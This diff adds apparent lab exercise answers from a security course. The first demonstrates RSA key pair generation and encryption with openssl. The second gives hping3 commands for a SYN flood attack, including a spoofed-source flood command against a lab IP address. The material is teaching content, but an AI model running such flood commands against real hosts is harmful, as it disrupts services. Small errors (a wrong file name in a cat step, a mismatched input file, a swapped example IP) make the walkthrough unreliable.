@@ -1,0 +1,56 @@
+
+
+Demonstrate the process of generating a public key and private key pair in RSA encryption.
+
+ANS:
+openssl version  
+openssl list -cipher-commands 
+
+mkdir user1 and User2 
+cd user1 and user2 
+
+on user1:
+openssl genrsa -out Privatekeyusr1.pem 2048
+cat Privatekeyusr1.pem 
+
+on user2:
+openssl genrsa -out Privatekeyusr2.pem  2048
+cat Privatekeyusr1.pem 
+
+on user1:
+openssl rsa -in Privatekeyusr1.pem -pubout -out Publickeyusr1.pem
+
+on user2:
+openssl rsa -in Privatekeyusr2.pem -pubout -out Publickeyusr2.pem
+
+on user1:
+cat >msg (to save the msg cnt D)
+
+openssl pkeyutl -encrypt -in file1 -out cipher -inkey /home/kali/Desktop/user2/Publickeyusr2.pem -pubin
+
+on user2:
+cp /home/kali/Desktop/user1/cipher  recive
+
+openssl pkeyutl  -decrypt -in recive -out msg -inkey Privatekeyusr2.pem
+
+
+
+Perform SYN flood attack, and exploit the TCP handshake process? 
+
+ANS:
+hping3 -S  200.200.200.2 -a 200.200.200.1 -p 80 -d 110 --flood
+
+Explanation of the options used:
+
+-c <number_of_packets>: Specifies the number of packets to send.
+-i <interval>: Specifies the interval between packets.
+-S: Sets the SYN flag in the TCP header, indicating the start of a TCP connection.
+-p <target_port>: Specifies the target port number on the victim machine.
+<target_IP>: Specifies the IP address of the target machine.
+For example, to send 100 SYN packets to port 80 of IP address 200.200.200.1 with an interval of 0.2 seconds between packets
+
+ANS2:
+hping3 -c 100 -i 0.2 -S -p 80 200.200.200.1
+
+
+
